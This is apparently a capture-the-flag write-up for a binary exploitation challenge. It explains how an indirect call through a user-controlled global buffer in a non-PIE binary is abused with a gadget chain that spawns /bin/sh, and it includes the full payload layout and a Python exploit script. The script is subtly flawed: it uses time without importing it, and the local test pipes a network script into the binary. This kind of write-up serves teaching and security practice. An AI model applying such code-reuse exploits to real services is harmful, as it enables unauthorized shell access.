# WRITEUP — Signal Relay (`signal-relay`)

- **Challenge category:** pwn / binary exploitation
- **Difficulty:** medium
- **Flag:** `fahemsec{jump_oriented_dispatcher_relays_the_chain}`
- **Binary:** `dist/relay` (also ships `libc.so.6`, `ld-linux-x86-64.so.2`)
- **Remote service:** `ncat --ssl <host> 443` (SSH-style interactive service)

---

## 1. TL;DR (30-second summary)

The program asks us to "register an uplink callsign" and reads our typed text into a
big scratch-pad area of memory. After reading, it calls a *function pointer* that is
stored *inside the same scratch-pad we just wrote*.

Because the binary is **not randomized** (No PIE), we know exactly where everything
lives in memory. So instead of typing a normal callsign, we type a **program** made of
specially chosen function addresses — the "relay" gadgets. The gadgets act like tiny
steps of a machine:

1. load the string `"/bin/sh"` into the first argument register,
2. zero the second and third argument registers,
3. load the "execute program" system call number,
4. run the system call.

That launches a shell connected to our socket, and we read the flag. It's like taking a
stamp collection (the gadgets) and assembling a custom sentence out of stamps.

---

## 2. Plain-English explanation (for non-technical readers)

### What is a computer program doing here?

When the program runs it prints:

```
=== Orbital Signal Relay :: node console ===
register uplink callsign> 
```

and waits for us to type a name. It's like a web form where you enter your name, and
the server stores it in a shared file and then shows a status message about you.

But there are two important quirks:

- **Quirk 1 — the "shared file" is a global memory area.** The name we type is placed
  directly into a global block of memory called `g_node`. The program then calls a
  function whose address was also stored in that block. It's as if the form had a line
  that said "and then the program should run whichever command is written on this
  sticky note" — and we get to write the sticky note.

- **Quirk 2 — addresses are predictable.** Most modern programs randomize their memory
  layout (ASLR). This binary was compiled **without** that protection, so every function
  lives at a fixed, known address. That's like knowing the exact house number of every
  tool in a toolbox, without ever having to search.

### The "relay machine"

The binary is not just one function; it contains a tiny *interpreter* — a set of very
small functions (gadgets) that the original authors intended to be chained together,
like railroad cars:

| Gadget | What it does (plain words) |
|---|---|
| `relay_bootstrap` | "Start the machine: point the data needle at my buffer." |
| `relay_dispatch` | "Pick up the next 8 bytes and jump to that address." |
| `relay_load_rdi` | "Put the 8 bytes right after me into the first argument slot." |
| `relay_zero_rsi` | "Set the second argument slot to zero." |
| `relay_zero_rdx` | "Set the third argument slot to zero." |
| `relay_exec_nr` | "Load the number of the `execve` system call (59)." |
| `relay_syscall` | "Ask the operating system to run a program." |

When we feed these addresses in the right order, the machine:

1. loads the text `"/bin/sh"` as the program to run,
2. passes no arguments and no environment,
3. asks the OS to execute `/bin/sh`.

`/bin/sh` is the standard command-line shell. Since our socket is the program's input
and output, the shell speaks directly to us. From there, reading `flag.txt` is trivial.

### The one pitfall that bit us

The first version of our payload put an extra 8 bytes of filler after **every**
instruction, assuming each took an operand. In reality, only `relay_load_rdi` consumes
an operand (16 bytes total); all the others are dense 8-byte pointers. With the filler,
the machine jumped to address `0x0` and crashed. Removing the extra operands made the
chain work. This is a great reminder: **read the actual gadget code before assuming
the calling convention.**

---

## 3. Technical analysis

### 3.1 Binary properties

```
$ file relay
relay: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

Protections:
  PIE          : Off   (fixed base 0x400000)   <-- the critical weakness
  NX           : On    (can't inject shellcode)
  Stack Canary : On    (but globals are unaffected by it)
  RELRO        : Partial
```

Because PIE is off, all code/data addresses are compile-time constants.

### 3.2 Reversed `main`

```
g_node = 0x404080            ; global .bss buffer, 0x180 bytes (readable+writable)

main:
    setvbuf(stdout, ...); setvbuf(stdin, ...)
    *(g_node + 0x28) = status            ; default handler stored at +0x28
    puts("=== Orbital Signal Relay :: node console ===")
    printf("register uplink callsign> ")
    read(0, g_node, 0x180)               ; we control ALL 0x180 bytes of g_node
    rax = *(g_node + 0x28)               ; load function pointer from our data
    call rax        (rdi = g_node)       ; indirect call into our controlled data
    puts("relay closing.")
```

Key line: `call *g_node[0x28]`. The function pointer that `main` invokes lives **inside
the buffer we just filled**. The default is `status`, but we overwrite it.

`status` merely does `printf("[relay] node '%s' idle -- no uplink registered.\n", rdi)`.

### 3.3 The relay gadgets (the interpreter)

All at fixed addresses (No PIE):

```
0x401202 relay_bootstrap:  lea  0x28(%rdi),%rbp      ; rbp = g_node+0x28  (data ptr)
                           mov  $0x40120f,%rbx       ; rbx = relay_dispatch (program counter)
                           jmp  *%rbx

0x40120f relay_dispatch:   add  $0x8,%rbp            ; advance data ptr by one slot
                           jmp  *0x0(%rbp)           ; jump to the 8-byte pointer there

0x401216 relay_load_rdi:   mov  0x8(%rbp),%rdi       ; operand: 8 bytes after current slot
                           add  $0x8,%rbp            ; consumes 8 extra bytes (16 total)
                           jmp  *%rbx

0x401220 relay_zero_rsi:   xor  %esi,%esi
                           jmp  *%rbx

0x401224 relay_zero_rdx:   xor  %edx,%edx
                           jmp  *%rbx

0x401228 relay_exec_nr:    mov  $0x3b,%eax           ; rax = 59 = __NR_execve
                           jmp  *%rbx

0x40122f relay_syscall:    syscall
                           jmp  *%rbx
```

Interpretation:

- `rbp` is a data pointer that walks through our buffer.
- `rbx` always holds `relay_dispatch` — every gadget "returns" to it, so the machine
  keeps stepping forward through the addresses we placed.
- Each 8-byte slot in the buffer is an instruction pointer. `relay_load_rdi` is the only
  instruction that also reads the *next* 8 bytes as an operand.

### 3.4 The vulnerability

`read` lets us fill the entire `g_node` structure, and `main` then performs an indirect
call through `*(g_node + 0x28)`. There is no check on what we stored there, and no
stack-adjacent write needed — the whole attack is a *code-reuse* chain built from the
program's own gadgets (a "jump-oriented" / dispatch-driven program).

---

## 4. Exploitation

### 4.1 Layout of the final payload

All values are fixed addresses (No PIE). `g_node = 0x404080`.

```
offset   address       contents            meaning
------   -----------   -----------------   ------------------------------------
0x00     0x404080      "/bin/sh\x00"       the string our shell will execute
...
0x28     0x4040a8      0x0000000000401202  relay_bootstrap   <- main calls this
0x30     0x4040b0      0x0000000000401216  relay_load_rdi
0x38     0x4040b8      0x0000000000404080  operand -> rdi = &"/bin/sh"
0x40     0x4040c0      0x0000000000401220  relay_zero_rsi     (rsi = 0)
0x48     0x4040c8      0x0000000000401224  relay_zero_rdx     (rdx = 0)
0x50     0x4040d0      0x0000000000401228  relay_exec_nr      (rax = 59)
0x58     0x4040d8      0x000000000040122f  relay_syscall      (execve)
```

### 4.2 Execution trace

```
main: call *(g_node+0x28) = relay_bootstrap,  rdi = 0x404080
relay_bootstrap:  rbp = 0x4040a8, rbx = relay_dispatch
relay_dispatch:   rbp = 0x4040b0, jump *(0x4040b0) = relay_load_rdi
relay_load_rdi:   rdi = *(0x4040b8) = 0x404080 ("/bin/sh"), rbp = 0x4040b8
relay_dispatch:   rbp = 0x4040c0, jump *(0x4040c0) = relay_zero_rsi
relay_zero_rsi:   esi = 0
relay_dispatch:   rbp = 0x4040c8, jump *(0x4040c8) = relay_zero_rdx
relay_zero_rdx:   edx = 0
relay_dispatch:   rbp = 0x4040d0, jump *(0x4040d0) = relay_exec_nr
relay_exec_nr:    rax = 0x3b  (__NR_execve)
relay_dispatch:   rbp = 0x4040d8, jump *(0x4040d8) = relay_syscall
relay_syscall:    syscall     --> execve("/bin/sh", 0, 0)  SUCCESS -> shell
```

Note the chain is **dense**: 8 bytes between pointers. The only operand is the 8 bytes
at `g_node+0x38`. A common mistake is padding after every instruction — that inserts a
`0` in a dispatch slot and the machine jumps to `NULL`.

### 4.3 Exploit script

```python
import socket, ssl, struct, sys

HOST = sys.argv[1]          # e.g. t89-xxxx.chals.ctf.sd
PORT = 443

def p64(x):
    return struct.pack("<Q", x)

payload  = b"/bin/sh\x00" + b"\x00" * 0x20          # string at g_node+0
chain = [
    0x401202,   # relay_bootstrap   (entry, main calls *(g_node+0x28))
    0x401216,   # relay_load_rdi
    0x404080,   # operand: rdi = address of "/bin/sh" (start of g_node)
    0x401220,   # relay_zero_rsi
    0x401224,   # relay_zero_rdx
    0x401228,   # relay_exec_nr    (rax = 0x3b)
    0x40122f,   # relay_syscall    (execve)
]
payload += b"".join(p64(a) for a in chain)          # note: dense, no filler

# connect (SSL like ncat --ssl)
raw = socket.create_connection((HOST, PORT), timeout=10)
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
s = ctx.wrap_socket(raw, server_hostname=HOST)
s.settimeout(2)

s.recv(4096)                                        # banner + prompt
s.sendall(payload)
time.sleep(0.3)
s.sendall(b"cat flag*; echo ---; id\n")             # we now have a shell
print(s.recv(4096).decode("latin1", "replace"))
```

Run it locally first with the provided loader (reproduces the shell), then against the
remote `ncat --ssl` endpoint.

### 4.4 Local verification (before going remote)

```bash
$ cd dist
$ (python3 exploit.py) | ./ld-linux-x86-64.so.2 --library-path . ./relay
=== Orbital Signal Relay :: node console ===
register uplink callsign> PWNED
uid=1000(swilam) gid=1000(swilam) ...
```

---

## 5. Flag

```
fahemsec{jump_oriented_dispatcher_relays_the_chain}
```

---

## 6. Lessons

- **No PIE turns arbitrary code-reuse into a solved puzzle** — fixed addresses mean
  gadgets can be freely composed.
- **`call *global[off]` is a write-what-you-call primitive** when the global is fully
  user-controlled.
- **Study each gadget's actual bytes** (how many bytes it consumes) before building the
  chain — an off-by-8 crash is a silent `jmp 0`.
- Always verify locally with the shipped `ld-linux`/`libc` before hitting the remote.
